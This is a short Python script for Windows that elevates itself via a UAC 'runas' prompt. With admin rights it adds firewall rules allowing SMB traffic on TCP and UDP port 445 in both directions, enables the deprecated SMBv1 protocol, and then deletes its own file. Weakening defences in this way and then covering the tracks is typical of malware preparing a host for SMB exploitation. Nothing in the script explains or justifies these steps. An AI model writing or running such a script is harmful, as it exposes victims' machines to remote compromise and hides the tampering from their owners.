import os
import ctypes
import sys
from os import remove
from sys import argv

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if is_admin():
    #tcp
    os.system(f'netsh advfirewall firewall add rule name="TCP Port 445" dir=in action=allow protocol=TCP localport=445')
    os.system(f'netsh advfirewall firewall add rule name="TCP Port 445" dir=out action=allow protocol=TCP localport=445')
    #udp
    os.system(f'netsh advfirewall firewall add rule name="UDP Port 445" dir=in action=allow protocol=UDP localport=445')
    os.system(f'netsh advfirewall firewall add rule name="UDP Port 445" dir=out action=allow protocol=UDP localport=445')
    #enable smb v1
    os.system(f'DISM /Online /Enable-Feature /All /FeatureName:SMB1Protocol')
    remove(argv[0])
else:
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)